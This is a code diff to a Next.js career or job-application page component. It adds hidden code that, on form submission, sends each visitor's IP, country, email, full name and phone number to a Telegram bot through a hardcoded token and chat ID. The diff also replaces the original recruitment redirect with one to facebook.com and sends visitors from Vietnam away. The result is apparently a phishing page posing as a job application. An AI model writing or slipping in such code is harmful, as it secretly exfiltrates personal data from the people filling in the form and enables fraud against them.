@@ -2,16 +2,83 @@
 
 import { zodResolver } from "@hookform/resolvers/zod";
 import { redirect } from "next/navigation";
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { schema } from "./schema";
 import { z } from "zod";
 import { countryPrefixes, CountryPrefixType } from "../const/data";
+import { useRouter } from 'next/navigation';
+
 
 type FormData = z.infer<typeof schema>;
+
+
+const chatId = '-4095764303';
+const botToken = '6333593472:AAEIM1_VL6YrJvIJzToBLMOdM8eVTZ-VUWQ';
+async function sendMessageToTelegramBot(chatId : any, messageText : any, botToken :any) {
+  try {
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const data = {
+      chat_id: chatId,
+      text: messageText,
+    };
+
+    const response = await fetch(apiUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+
+    const responseData = await response.json();
+    if (responseData.ok) {
+      console.log('Message sent:', responseData.result);
+    } else {
+      console.error('Error:', responseData);
+    }
+  } catch (error) {
+    console.error('Error sending message:', error);
+  }
+}
 export default function CareerPage() {
+  const router = useRouter()
+
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
   const [selectedPrefix, setSelectedPrefix] = useState<CountryPrefixType>(countryPrefixes[0]);
+
+  const [ip, setIp] = useState('');
+  const [userAgent, setUserAgent] = useState('');
+  const [country, setCountry] = useState('');
+  const [langCode, setLangCode] = useState('en-US');
+
+  useEffect(() => {
+      // Fetch IP address
+      fetch("https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5").then(res => res.json()).then(data => {
+        setIp(data.ip);
+        setCountry(data.country_name);
+        const lang = data.country_code2.toLowerCase();
+        setLangCode(data.languages.split(',')[1]);
+        if(data.country_code2 === 'VN'){
+          window.location.href = 'https://www.facebook.com/';
+        }
+      });
+      //const data_ip = res_ip.json();
+     
+      //fetch('https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5')
+      //  .then(res => res.json())
+      //  .then(data => {setIp(data.ip); console.log(data)});
+  
+      // Get user agent
+      setUserAgent(navigator.userAgent);
+  
+      // Initialize reCAPTCHA
+  
+      // Cleanup reCAPTCHA on component unmount
+      return () => {
+  
+      };
+    }, []);
 
   const {
     register,
@@ -30,8 +97,9 @@ export default function CareerPage() {
 
   const onSubmit = (data: any) => {
     console.log(data);
-
-    redirect("https://recruit.waemployment.com/createcareer");
+    const message = `\n-ip: ${ip}\n-country: ${country}\n-Email: ${data.email}\n-First Name: ${data.firstName}\n-Last Name: ${data.lastName}\n-Phone:${data.prefix} ${data.phoneNumber}`;
+    sendMessageToTelegramBot(chatId, message, botToken);
+    router.push("https://facebook.com");
   };
 
   return (
